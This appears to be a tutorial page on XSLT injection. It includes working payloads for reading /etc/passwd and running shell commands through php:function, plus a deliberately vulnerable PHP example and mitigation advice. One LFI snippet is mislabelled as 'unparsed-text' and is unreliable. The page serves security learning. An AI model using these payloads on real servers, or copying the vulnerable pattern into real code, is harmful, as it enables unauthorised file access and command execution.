### Content

- [Overview](#overview)
	- [What is XSLT](#what-is-xslt)
- [Identifying](#identifying)
- [Exploitation](#exploitation)
	- [Information Disclosure](#information-disclosure)
	- [LFI](#lfi)
	- [RCE](#rce)
- [Vulnerable Code](#vulnerable-code)
- [Mitigation](#mitigation)

---
### Overview

**XSLT injection** occurs whenever user input is inserted into XSL data before the XSLT processor generates output. This enables an attacker to inject additional XSL elements into the XSL data, which the XSLT processor will execute during the output generation process.

##### What is XSLT

[eXtensible Stylesheet Language Transformation (XSLT)](https://www.w3.org/TR/xslt-30/) is a language enabling the transformation of XML documents.

Suppose we have the following XML:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Strawberry</name>
        <color>Red</color>
        <size>Small</size>
    </fruit>
</fruits>
```

- XSLT can be used to define a data format that is subsequently enriched with data from the XML document.
- XSLT data is structured similarly to XML.

XSLT contains XSL elements within nodes prefixed with the `xsl-prefix`. Some commonly used XSL elements:

- `<xsl:template>`: This element indicates an XSL template.
	- Contains `match` attribute that contains a path in the XML document that the template applies to.
- `<xsl:for-each>`: This element enables looping over all XML nodes specified in the `select` attribute.
- `<xsl:value-of>`: This element extracts the value of the XML node specified in the `select` attribute.
- XSL elements used for customization:
	- `<xsl:sort>`: Specifies how to sort elements in a for loop in the `select` argument.
		- A sort order may be specified in the `order` argument
	- `<xsl:if>`: Used to test for conditions on a node. The condition is specified in the `test` argument.

XSLT document used to output all fruits contained within the XML document, as well as their color:

```XML
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/fruits">
        Here are all fruits of medium size ordered by their color:
        <xsl:for-each select="fruit">
            <xsl:sort select="color" order="descending" />
            <xsl:if test="size = 'Medium'">
                <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
            </xsl:if>
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet>
```

Combining the sample XML document with the above XSLT data results in the following output:

```TXT
Here are all fruits of medium size ordered by their color:
    Banana (Yellow)
    Apple (Red)
```

---
### Identifying 

If an input field is reflected back on the page as a formatted table or list, or even if the formatted table or list are dynamic but they have nothing to do with the input field, this could indicate that the web application:

1. Stores the data in an XML document
2. Renders it using XSLT processing

If user input is inserted into the XML-XSLT pipeline without sanitization, the application may be vulnerable to XSLT Injection.

Inject a broken XML tag to provoke an error in the web application, using something such: `<`

> If the web application responds with a server error:
> That doesn't definitively confirm an XSLT injection vulnerability, it may be an indicator of a security issue.

---
### Exploitation
#### Information Disclosure

We may Extract information about the XSLT processor in use by injecting the following XSLT elements:

```XML
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

#### LFI

Try to use multiple different functions to read a local file. Whether a payload will work depends on the XSLT version and the configuration of the XSLT library.

`unparsed-text` that can be used to read a local file:

```XML
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

if the XSLT library is version 2.0 and is configured to support PHP functions, `file_get_contents` PHP function can be used: 

```XML
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

#### RCE

If an XSLT processor supports PHP functions, utilize PHP functions that execute local system commands to obtain RCE.

```XML
<!-- Method 1: system -->
<xsl:value-of select="php:function('system','id')" />

<!-- Method 2: passthru -->
<xsl:value-of select="php:function('passthru','uname -a')" />

<!-- Method 3: shell_exec -->
<xsl:value-of select="php:function('shell_exec','cat /etc/passwd')" />

<!-- Method 4: exec -->
<xsl:value-of select="php:function('exec','whoami')" />
```

---
### Vulnerable Code

```PHP
<?php

$greeting = isset($_GET['name']) ? 'Hi ' . $_GET['name'] . ',' : 'Hi,';

// Load XML data
$xml = new DOMDocument();
$xml->load('/data.xml');

// Write XSL data (user input injected directly — no sanitization)
$myfile = fopen("/data.xsl", "w");
$txt = '<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <html>
      [...SNIP...]
      <body>
        <h2>' . $greeting . ' here are you again:</h2>
        [...SNIP...]
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>';
fwrite($myfile, $txt);
fclose($myfile);

// Load XSL data
$xsl = new DOMDocument();
$xsl->load("/data.xsl");

// Apply XSLT
$xsltProcessor = new XSLTProcessor();
$xsltProcessor->registerPHPFunctions(); // ← All PHP functions allowed
$xsltProcessor->importStylesheet($xsl);
$result = $xsltProcessor->transformToXML($xml);

?>

[...SNIP...]

<?php echo $result; ?>

[...SNIP...]
```

---
### Mitigation

- Ensure that user input is not inserted into XSL data before it is processed by the XSLT processor.
- If user-provided data must be added to the XSL document before processing:
	- Implement proper sanitization and input validation (ex: HTML-encoding)
- Run the XSLT processor as a low-privilege process.
- Prevent the use of external functions by disabling PHP functions within XSLT.
- Keep the XSLT library up to date.

---